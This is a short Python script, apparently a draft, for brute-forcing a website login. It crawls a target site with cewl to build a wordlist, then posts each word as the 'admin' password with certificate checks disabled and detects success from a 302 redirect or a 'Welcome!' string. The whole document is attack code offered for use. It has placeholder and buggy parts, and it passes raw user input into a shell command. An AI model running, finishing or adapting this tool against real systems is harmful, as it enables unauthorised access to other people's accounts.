#Wireframe for password bruteforcing 

#Generate wordlist with cewl

#Logic for checking if password was successful 

#1) Look at response code, like a 302 redirect

#2) Look for a keyword like "Welcome" or "Success" in the response to indicate a successful response

import os 
import requests

def generate_wordlist():
	#-d 2 -m 5 -w docswords.txt https://example.com
	print("")
	print("")
	print ("")
	site = input("Enter the site you wish to fuzz: ")
	depth = input("Enter the page depth you would like to crawl: ")
	word_length = input ("Enter the minimum password length: ")
	word_list = site + "_wordlist.txt"
	command = "cewl -d " + depth + " -m " + word_length + " -w " + word_list + " -s " + site
	print (command)
	os.system(command)
	lines = ""
	with open(word_list) as f:
		lines = f.readlines()
		return lines
	return ""

def bruteforce(wordlist):
	for word in wordlist:
	#use Python requests module to send desired username and password from wordlist to the site
	#call either check_success function depending on the log-in page output
		url = "URL for login"
		creds = {'username': 'admin', 'password:': word}
		site_output = requests.post(url, verify=False, json=creds)
		if check_success_response_code(site_output) or check_success_page_content(site_output):
			print ("password found!")
			return word
			return ""


def check_success_response_code(site_output):
#assume the site redirects after a successful login
	if site_output.status_code == 302:
		return True
	return False


def check_success_page_content(site_output):
#assume the word "Welcome!" is in the page output
	if "Welcome!" in site_output.text:
		return True
	return False

def main():
	password_list = generate_wordlist()
	print (bruteforce(password_list))

main()